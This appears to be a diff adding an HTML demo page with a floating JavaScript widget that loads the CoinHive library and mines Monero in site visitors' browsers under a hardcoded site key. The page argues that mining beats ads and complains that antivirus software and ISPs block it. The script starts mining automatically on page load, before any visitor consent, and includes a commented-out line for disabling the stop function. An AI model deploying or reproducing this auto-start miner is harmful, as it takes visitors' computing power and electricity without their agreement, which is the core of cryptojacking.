@@ -1,0 +1,467 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Monero miner friendly simple GUI by C0nw0nk</title>
+<meta charset="UTF-8" />
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+</head>
+<body>
+<style>
+html, body {
+    margin: 0;
+    padding: 0;
+    border: 0;
+}
+</style>
+This script is to show as a example how easy it is to embed a nice floating mining widget into your site for your users to interact with.<p>
+It is very easy to modify / read you can easly change the designs colors and styles yourself, Enjoy.
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<br>
+<h1>Reasons for this script :</h1>
+<ul>
+<li>It is silent can use little to no cpu power and provides a clean ad free internet experience while allowing the sites you love to stay online.</li>
+<li>Ads can be intrusive and annoying, Look at popups for example, flashing images, auto playing sounds etc.</li>
+<li>Advertisers don't pay for VPN/Proxy connected or related traffic because they consider it BOT traffic without considering the fact it is only increasing as goverments and who ever you pay every month to supply you with internet access create blockades and blacklists forcing people to use such services to access sites. If someone connects and browses with a known flagged VPN/Proxy to them even if that user is displaying ads and can see them you earn nothing.</li>
+<li>Advertisers can scam and won't pay a penny for the most outrageous of reasons.</li>
+<li>Advertisers take a percentage before paying you.</li>
+<li>Banks, Paypal all also take a percentage and charge fees on transactions of money earned leaving you with less and less hard earned money for your work.</li>
+</ul>
+<br>
+<h1>Same problems as advertisers have with adblockers :</h1>
+<ul>
+<li>People use their hosts files to blackhole and block domains they can do the same with this.</li>
+<li>Your internet service provider also blocking domain access to this script, Soloution can be to login to your account online and turn off parental filters etc what ever it is listed under if they allow you to remove the blocks.</li>
+<li>Anti-Viruses and external programs block mining but not popups or other ads that are far more intrusive. (I realy questioned why AV Software and Internet service providers block this script but not the companies taking over my browser with popup windoiws and opening as many tabs as they please.)</li>
+</ul>
+<br>
+<h1>Questionable behaviour by companies who oppose this :</h1>
+<ul>
+<li>We all have seen sites with Javascript based games that are also cpu intensive but we don't see them getting blocked by Anti-viruses, Adblockers, Internet service providers etc.</li>
+<li>Ads, popups get allowed by them all but mining gets blocked.</li>
+</ul>
+<br>
+<br>
+<br>
+<br>
+Began Javascript tag here :
+<script type="text/javascript">
+/*
+Copyright @ Credit https://github.com/C0nw0nk/CoinHive
+
+Expect regular updates and any issues post here : https://github.com/C0nw0nk/CoinHive/issues
+*/
+
+(function(){
+var a = function() {try{return !!window.addEventListener} catch(e) {return !1} },
+b = function(b, c) {a() ? document.addEventListener("DOMContentLoaded", b, c) : document.attachEvent("onreadystatechange", b)};
+b(function(){
+
+(function(){
+var createScriptElement = document.createElement('script'); createScriptElement.type = 'text/javascript'; //createScriptElement.async = true;
+var getScriptElement = document.getElementsByTagName('script')[0];
+createScriptElement.src = 'https://coinhive.com/lib/coinhive.min.js';
+createScriptElement.onload = function () {
+
+	/*HTML Element Names*/
+	/*Start Element id names*/
+	var html_miner = "miner";
+	var html_mining_stats_canvas = "mining-stats-canvas";
+	var html_miner_is_running = "mining-is-running";
+	var html_miner_is_running_id = "mining-is-running-id";
+	var html_miner_is_running_id_output = "mining-is-running-id-output";
+	var html_miner_is_running_id_output_yes = "mining-is-running-id-output-yes";
+	var html_miner_is_running_id_output_no = "mining-is-running-id-output-no";
+	var html_mining_hashes_per_second = "mining-hashes-per-second";
+	var html_mining_hashes_per_second_id = "mining-hashes-per-second-id";
+	var html_mining_hashes_per_second_id_output = "mining-hashes-per-second-id-output";
+	var html_mining_accepted_hashes_per_second = "mining-accepted-hashes-per-second";
+	var html_mining_accepted_hashes_per_second_id = "mining-accepted-hashes-per-second-id";
+	var html_mining_accepted_hashes_per_second_id_output = "mining-accepted-hashes-per-second-id-output";
+	var html_mining_threads = "mining-threads";
+	var html_mining_threads_id = "mining-threads-id";
+	var html_mining_threads_id_output = "mining-threads-id-output";
+	var html_mining_threads_add = "mining-threads-add";
+	var html_mining_threads_remove = "mining-threads-remove";
+	var html_mining_hashes_total = "mining-hashes-total";
+	var html_mining_hashes_total_id = "mining-hashes-total-id";
+	var html_mining_hashes_total_id_output = "mining-hashes-total-id-output";
+	var html_mining_start = "mining-start";
+	var html_mining_stop = "mining-stop";
+	var html_addthreads = "addthreads";
+	var html_removethreads = "removethreads";
+	var html_startmining = "startmining";
+	var html_stopmining = "stopmining";
+	var html_mining_maximum_speed = "mining-maximum-speed";
+	var html_mining_minimal_speed = "mining-minimal-speed";
+	var html_mining_default_recommended_speed = "mining-default-recommended-speed";
+	/*End Element id names*/
+
+	/*Start tooltip id*/
+	var html_tooltip_id = "tooltiptext";
+	var html_tooltip_class_name = "tooltip";
+	/*End tooltip id*/
+
+	/*Start button class*/
+	var html_button_class_name = "miner-button-class";
+	/*End button class*/
+	
+	/*Start text area class*/
+	var html_text_area_class_name = "miner-text-area-class";
+	/*End text area class*/
+
+	/*Start Text Language*/
+	var html_text_is_running = "";//"Status";
+	var html_text_is_running_true = "Online";
+	var html_text_is_running_false = "Offline";
+	var html_text_is_running_tooltip = "If the miner is currently running.";
+	var html_text_hashes_per_second = "Hashes/s | ";
+	var html_text_hashes_per_second_tooltip = "The total number of hashes per second for all threads combined.";
+	var html_text_accepted_hashes_per_second = "Accepted Hashes | ";
+	var html_text_accepted_hashes_per_second_tooltip = "The number of hashes that have been accepted by the pool.";
+	var html_text_current_number_of_threads = "Threads | ";
+	var html_text_current_number_of_threads_tooltip = "Amount of threads you have running currently.";
+	var html_text_threads_add = "+";
+	var html_text_threads_add_tooltip = "Speed it up! Increases threads, but too many may slow your browser. 3 or 4 are OK in most cases.";
+	var html_text_threads_remove = "-";
+	var html_text_threads_remove_tooltip = "Slow it down! (decrease threads to 0 to stop entirely)";
+	var html_text_hashes_total = "Total Hashes | ";
+	var html_text_hashes_total_tooltip = "Hashes you solved so far. We will remove all ads for you once you mine enough. Login to have it keep track of your progress.";
+	var html_text_start = "Start";
+	var html_text_start_tooltip = "Start the miner.";
+	var html_text_stop = "Stop";
+	var html_text_stop_tooltip = "Stop the miner.";
+	var html_text_help = "Information";
+	var html_text_help_tooltip = "Built by C0nw0nk";
+	var html_text_credits = "Credits";
+	var html_text_credits_tooltip = "https://github.com/C0nw0nk/CoinHive";
+	var html_text_usage_minimal = "";
+	var html_text_usage_max_out = "";
+	var html_text_usage_default = "";
+	/*End Text Language*/
+	/*End HTML Element Names*/
+
+	/*Create Elements*/
+	var createDivElement = document.createElement('div');
+	createDivElement.id = html_miner;
+	document.body.appendChild(createDivElement);//getScriptElement.parentNode.insertBefore(createDivElement, getScriptElement); //Create our div element
+
+	new_html = "<div id='"+ html_mining_stats_canvas +"'></div>";
+	document.getElementById(html_miner).innerHTML = new_html;
+
+	new_html = "<div id='"+ html_miner_is_running +"' class='"+ html_tooltip_class_name +" "+ html_text_area_class_name +"'><span id='"+ html_miner_is_running_id +"'>"+ html_text_is_running +"</span><span id='"+ html_miner_is_running_id_output +"'></span><span id='"+ html_tooltip_id +"'>"+ html_text_is_running_tooltip +"</span></div>";
+	document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
+
+	new_html = "<div id='"+ html_mining_hashes_per_second +"' class='"+ html_tooltip_class_name +" "+ html_text_area_class_name +"'><span id='"+ html_mining_hashes_per_second_id +"'>"+ html_text_hashes_per_second +"</span><span id='"+ html_mining_hashes_per_second_id_output +"'></span><span id='"+ html_tooltip_id +"'>"+ html_text_hashes_per_second_tooltip +"</span></div>";
+	document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
+
+	new_html = "<div id='"+ html_mining_accepted_hashes_per_second +"' class='"+ html_tooltip_class_name +" "+ html_text_area_class_name +"'><span id='"+ html_mining_accepted_hashes_per_second_id +"'>"+ html_text_accepted_hashes_per_second +"</span><span id='"+ html_mining_accepted_hashes_per_second_id_output +"'></span><span id='"+ html_tooltip_id +"'>"+ html_text_accepted_hashes_per_second_tooltip +"</span></div>";
+	document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
+
+	new_html = "<div id='"+ html_mining_threads +"' class='"+ html_tooltip_class_name +" "+ html_text_area_class_name +"'><span id='"+ html_mining_threads_id +"'>"+ html_text_current_number_of_threads +"</span><span id='"+ html_mining_threads_id_output +"'></span><span id='"+ html_tooltip_id +"'>"+ html_text_current_number_of_threads_tooltip +"</span></div>";
+	document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
+
+	new_html = "<div id='"+ html_mining_threads_add +"' class='"+ html_tooltip_class_name +" "+ html_button_class_name +"'><span id='"+ html_addthreads +"'>"+ html_text_threads_add +"</span><span id='"+ html_tooltip_id +"'>"+ html_text_threads_add_tooltip +"</span></div>";
+	document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
+
+	new_html = "<div id='"+ html_mining_threads_remove +"' class='"+ html_tooltip_class_name +" "+ html_button_class_name +"'><span id='"+ html_removethreads +"'>"+ html_text_threads_remove +"</span><span id='"+ html_tooltip_id +"'>"+ html_text_threads_remove_tooltip +"</span></div>";
+	document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
+
+	new_html = "<div id='"+ html_mining_hashes_total +"' class='"+ html_tooltip_class_name +" "+ html_text_area_class_name +"'><span id='"+ html_mining_hashes_total_id +"'>"+ html_text_hashes_total +"</span><span id='"+ html_mining_hashes_total_id_output +"'></span><span id='"+ html_tooltip_id +"'>"+ html_text_hashes_total_tooltip +"</span></div>";
+	document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
+
+	new_html = "<div id='"+ html_mining_start +"' class='"+ html_tooltip_class_name +" "+ html_button_class_name +"'><span id='"+ html_startmining +"'>"+ html_text_start +"</span><span id='"+ html_tooltip_id +"'>"+ html_text_start_tooltip +"</span></div>";
+	document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
+
+	new_html = "<div id='"+ html_mining_stop +"' class='"+ html_tooltip_class_name +" "+ html_button_class_name +"'><span id='"+ html_stopmining +"'>"+ html_text_stop +"</span><span id='"+ html_tooltip_id +"'>"+ html_text_stop_tooltip +"</span></div>";
+	document.getElementById(html_mining_stats_canvas).innerHTML += new_html;
+	/*End Create Elements*/
+
+	/*Create Style Sheet*/
+	var createStyleElement = document.createElement('style'); createStyleElement.type = "text/css";
+	createStyleElement.innerHTML += ""
+	+"#"+html_miner+"{"
+	+"position:fixed;"
+	+"bottom:0;"
+	+"left:0;"
+	+"background-color:#262626;"
+	+"color:#FFFFFF;"
+	+"width:auto;"
+	+"height:auto;"
+	+"}"
+	+"#"+html_mining_stats_canvas+"{"
+	+"display:inline-block;"
+	+"width:100%;"
+	+"}"
+	+"#"+html_miner_is_running+"{"
+	+"display:inherit;"
+	+"}"
+	+"#"+html_miner_is_running_id+"{"
+	+"}"
+	+"#"+html_miner_is_running_id_output+"{"
+	+"}"
+	+"."+html_miner_is_running_id_output_yes+"{"
+	+"color:greenyellow;"
+	+"}"
+	+"."+html_miner_is_running_id_output_no+"{"
+	+"color:#f00;"
+	+"}"
+	+"#"+html_mining_hashes_per_second+"{"
+	+"display:inherit;"
+	+"}"
+	+"#"+html_mining_hashes_per_second_id+"{"
+	+"display:inherit;"
+	+"}"
+	+"#"+html_mining_hashes_per_second_id_output+"{"
+	+"display:inherit;"
+	+"}"
+	+"#"+html_mining_accepted_hashes_per_second+"{"
+	+"display:inherit;"
+	+"}"
+	+"#"+html_mining_threads+"{"
+	+"display:inherit;"
+	+"}"
+	+"#"+html_mining_threads_add+"{"
+	+"display:inherit;"
+	+"}"
+	+"#"+html_mining_threads_remove+"{"
+	+"display:inherit;"
+	+"}"
+	+"#"+html_mining_hashes_total+"{"
+	+"display:inherit;"
+	+"}"
+	+"#"+html_mining_start+"{"
+	+"display:inherit;"
+	+"}"
+	+"#"+html_mining_stop+"{"
+	+"display:inherit;"
+	+"}"
+	+"#"+html_addthreads+"{"
+	+"}"
+	+"#"+html_removethreads+"{"
+	+"}"
+	+"#"+html_startmining+"{"
+	+"}"
+	+"#"+html_stopmining+"{"
+	+"}"
+	/*Start miner buttons*/
+	+"."+html_button_class_name+"{"
+	+"text-decoration: none;"
+	+"display: inline-block;"
+	+"padding: 0px 10px;"
+	+"margin: 2px;"
+	+"border: 1px solid #C7C7C7;"
+	+"border-radius: 3px;"
+	+"-moz-border-radius: 2px;"
+	+"-webkit-border-radius: 2px;"
+	+"background: #636A6C;"
+	+"background: -moz-linear-gradient(top,#636A6C 0%,#51575A 100%);"
+	+"background: -webkit-gradient(linear,left top,left bottom,color-stop(0%,#636A6C),color-stop(100%,#51575A));"
+	+"background: -webkit-linear-gradient(top,#636A6C 0%,#51575A 100%);"
+	+"background: -o-linear-gradient(top,#636A6C 0%,#51575A 100%);"
+	+"background: -ms-linear-gradient(top,#636A6C 0%,#51575A 100%);"
+	+"background: linear-gradient(top,#636A6C 0%,#51575A 100%);"
+	+"filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#636A6C',endColorstr='#51575A',GradientType=0);"
+	+"}"
+	+"."+html_button_class_name+":hover{"
+	+"display: inline-block;"
+	+"padding: 0px 10px;"
+	+"margin: 2px;"
+	+"border-radius: 3px;"
+	+"background: #ddd;"
+	+"background: -webkit-gradient(linear,left top,left bottom,color-stop(0,#fff),color-stop(1,#ddd));"
+	+"background: -moz-linear-gradient(top center,#fff 0%,#ddd 100%);"
+	+"background: -webkit-linear-gradient(top,#ffffff 0%,#dddddd 100%);"
+	+"background: -o-linear-gradient(top,#ffffff 0%,#dddddd 100%);"
+	+"background: -ms-linear-gradient(top,#ffffff 0%,#dddddd 100%);"
+	+"background: linear-gradient(top,#ffffff 0%,#dddddd 100%);"
+	+"filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffff',endColorstr='#dddddd',GradientType=0);"
+	+"border: 1px solid;"
+	+"border-color: #ddd #bbb #999;"
+	+"cursor: pointer;"
+	+"color: #333;"
+	+"}"
+	/*End miner buttons*/
+	/*Start text area box*/
+	+"."+html_text_area_class_name+"{"
+	+"border:1px solid #e5e5e4;"
+	+"padding:0px 5px 0px 5px;"
+	+"}"
+	/*End text area box*/
+	/*Start ToolTip*/
+	+"."+html_tooltip_class_name+"{"
+	+"position: relative;"
+	+"overflow:visible;"
+	+"}"
+	+"."+html_tooltip_class_name+" #"+html_tooltip_id+"{"
+	+"visibility: hidden;"
+	+"width:0px;"
+	+"height:0px;"
+	+"background-color: black;"
+	+"color: #fff;"
+	+"text-align: center;"
+	+"border-radius: 6px;"
+	+"padding: 5px 5px;"
+	+"position: absolute;"
+	+"z-index: 1;"
+	+"bottom: 150%;"
+	+"left: 50%;"
+	+"margin-left: -5px;"
+	+"}"
+	+"."+html_tooltip_class_name+":hover #"+html_tooltip_id+"{"
+	+"visibility: visible;"
+	+"width:auto;"
+	+"height:auto;"
+	+"overflow:hidden;"
+	+"white-space:nowrap;"
+	+"}"
+	/*End ToolTip*/
+	+"";
+	getScriptElement.parentNode.insertBefore(createStyleElement, getScriptElement); //Create our StyleSheet element
+	/*End Create Style Sheet*/
+
+	/*Start CoinHive functions*/
+	/*
+	threads     The number of threads the miner should start with. The default is navigator.hardwareConcurrency, i.e. the number of CPU cores available on the user's computer.
+	autoThreads Whether to automatically adjust the number of threads for optimal performance. This feature is experimental. The default is false.
+	throttle    The fraction of time that threads should be idle. See miner.setThrottle() for a detailed explanation. The default is 0.
+	forceASMJS  If true, the miner will always use the asm.js implementation of the hashing algorithm. If false, the miner will use the faster WebAssembly version if supported and otherwise fall back to asm.js. The default is false.
+	*/
+	var miner = new CoinHive.Anonymous('6Y2vO0GuPf3nInwjZfxSHdwE8gKUHsLE', {});
+	function getHashesPerSecond() {
+		return miner.getHashesPerSecond().toFixed(1);
+	}
+	function getTotalHashes(interpolate) {
+		return miner.getTotalHashes(interpolate);
+	}
+	function getAcceptedHashes() {
+		return miner.getAcceptedHashes();
+	}
+	function stop() {
+		return miner.stop();
+	}
+	function start(mode) {
+		return miner.start(mode);
+	}
+	function getNumThreads() {
+		return miner.getNumThreads();
+	}
+	function setNumThreads(numThreads) {
+		return miner.setNumThreads(numThreads);
+	}
+	function threadsAdd() {
+		return setNumThreads(getNumThreads()+1);
+	}
+	function threadsRemove() {
+		return setNumThreads(getNumThreads()-1);
+	}
+	function isRunning() {
+		return miner.isRunning();
+	}
+	function hasWASMSupport() {
+		return miner.hasWASMSupport();
+	}
+	function getAutoThreadsEnabled() {
+		return miner.getAutoThreadsEnabled();
+	}
+	function setAutoThreadsEnabled(enabled) {
+		return miner.setAutoThreadsEnabled(enabled);
+	}
+	function getThrottle() {
+		return miner.getThrottle();
+	}
+	function setThrottle(throttle) {
+		return miner.setThrottle(throttle);
+	}
+	function IncreaseThrottle() {
+		return setThrottle(getThrottle() + 0.1);
+	}
+	function DecreaseThrottle() {
+		return setThrottle(getThrottle() - 0.1);
+	}
+	function getToken() {
+		return miner.getToken();
+	}
+	var original_recommended_thread_count = getNumThreads();
+	function maximum_settings() {
+		setThrottle(0);
+		setNumThreads(original_recommended_thread_count);
+	}
+	function minimal_settings() {
+		setThrottle(0.9);
+		setNumThreads(1);
+	}
+	//minimal_settings();
+	setThrottle(0.9);
+	/*End CoinHive functions*/
+
+	/*functions to be called onclick interactions with elements*/
+	document.getElementById(html_mining_threads_add).onclick = function() {return threadsAdd();};
+	document.getElementById(html_mining_threads_remove).onclick = function() {return threadsRemove();};
+	document.getElementById(html_mining_start).onclick = function() {return start();};
+	document.getElementById(html_mining_stop).onclick = function() {return stop();};
+	/*End Functions to be called onclick*/
+
+	/*
+	CoinHive.IF_EXCLUSIVE_TAB    The miner will only start if no other tabs are already mining. If all miners in other tabs are stopped or closed at a later point, the miner will then start. This ensures that one miner is always running as long as one tab of your site is open while keeping costly pool reconnections at a minimum.
+	CoinHive.FORCE_EXCLUSIVE_TAB The miner will always start and immediately kill all miners in other tabs that have not specified CoinHive.FORCE_MULTI_TAB.
+	CoinHive.FORCE_MULTI_TAB     The miner will always start. It will not announce its presence to other tabs, will not kill any other miners and can't be killed by other miners. This mode is used by the captcha and shortlinks.
+	*/
+	start(/*above mode can be defined here*/); //Start the miner Automaticly
+	
+	/*Disable functions*/
+	//miner.stop = undefined;
+	/*End Disable functions*/
+
+	// Listen on Events
+	miner.on('open', function() { /* open */ })
+	miner.on('authed', function(params) { /*console.log('Token name is: ', getToken());*/ });
+	miner.on('close', function() { /* close */ })
+	miner.on('error', function(params) { /*if (params.error !== 'connection_error') {console.log('The pool reported an error', params.error);}*/ });
+	miner.on('job', function() { /* job */ })
+	miner.on('found', function() { /* Hash found */ })
+	miner.on('accepted', function() { /* Hash accepted by the pool */ })
+	// End Listen Events
+
+	// Timer Update stats once per second
+	setInterval(function() {
+		is_running = "";
+		if (isRunning()) {
+			is_running = html_text_is_running_true;
+			document.getElementById(html_miner_is_running_id_output).className = html_miner_is_running_id_output_yes;
+		} else {
+			is_running = html_text_is_running_false;
+			document.getElementById(html_miner_is_running_id_output).className = html_miner_is_running_id_output_no;
+		}
+		// Output to HTML elements
+		document.getElementById(html_miner_is_running_id_output).innerHTML = is_running;
+		document.getElementById(html_mining_hashes_per_second_id_output).innerHTML = getHashesPerSecond();
+		document.getElementById(html_mining_accepted_hashes_per_second_id_output).innerHTML = getAcceptedHashes();
+		document.getElementById(html_mining_threads_id_output).innerHTML = getNumThreads();
+		document.getElementById(html_mining_hashes_total_id_output).innerHTML = getTotalHashes(true);
+	}, 1000);
+	// End Timer
+
+}
+createScriptElement.onerror = function () {
+/*document display error message*/
+}
+getScriptElement.parentNode.insertBefore(createScriptElement, getScriptElement);
+
+})();
+
+}, false);
+})();
+</script>
+Script tag ended here :
+<br>
+<br>
+<br>
+Body Tag ends here :
+</body>
+</html>
